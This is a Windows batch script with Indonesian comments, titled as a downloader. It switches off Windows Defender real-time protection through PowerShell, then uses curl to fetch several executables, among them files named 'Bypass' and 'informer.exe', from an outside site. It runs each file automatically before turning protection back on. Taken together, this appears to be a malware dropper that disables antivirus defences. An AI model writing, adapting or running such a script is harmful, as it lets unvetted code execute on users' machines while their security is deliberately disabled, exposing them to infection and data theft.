@echo off
title Sumpruy Downloader - Fixed
set "DL_DIR=C:\Sumpruy_Downloads"
mkdir "%DL_DIR%" 2>nul
cd /d "%DL_DIR%"

:: Matiin antivirus sementara (kalau Windows Defender)
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1

echo.
echo ========================================
echo MULAI DOWNLOAD DENGAN RETRY
echo ========================================
echo.

:: DAFTAR FILE
set "FILES=StarDesk.exe informer.exe seeu.exe Bypass Noir.exe"

:: LOOP DOWNLOAD + RETRY 3 KALI
for %%F in (%FILES%) do (
    setlocal enabledelayedexpansion
    set "FILE=%%F"
    set "URL=https://trueadam.site/%%F"
    
    echo Downloading !FILE!...
    set "TRY=1"
    :retry
    if !TRY! GTR 3 (
        echo ❌ Gagal download !FILE! setelah 3 kali percobaan.
        goto next
    )
    
    :: HAPUS FILE LAMA
    if exist "!FILE!" del "!FILE!"
    
    :: DOWNLOAD PAKAI CURL
    curl -L -o "!FILE!" "!URL!" --silent --show-error
    
    :: CEK UKURAN
    if exist "!FILE!" (
        for %%Z in ("!FILE!") do (
            if %%~zZ LSS 10240 (
                echo ⚠️ File !FILE! terlalu kecil (%%~zZ bytes), mencoba ulang...
                del "!FILE!"
                set /a TRY=!TRY!+1
                timeout /t 2 /nobreak >nul
                goto retry
            ) else (
                echo ✅ !FILE! berhasil didownload (%%~zZ bytes)
                timeout /t 1 /nobreak >nul
                echo 🚀 Menjalankan !FILE! ...
                start "" "!FILE!"
            )
        )
    ) else (
        echo ⚠️ !FILE! gagal download, mencoba ulang...
        set /a TRY=!TRY!+1
        timeout /t 2 /nobreak >nul
        goto retry
    )
    :next
    endlocal
)

:: Nyalakan lagi antivirus (opsional)
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1

echo.
echo ========================================
echo SELESAI. CEK FOLDER C:\Sumpruy_Downloads
echo ========================================
pause
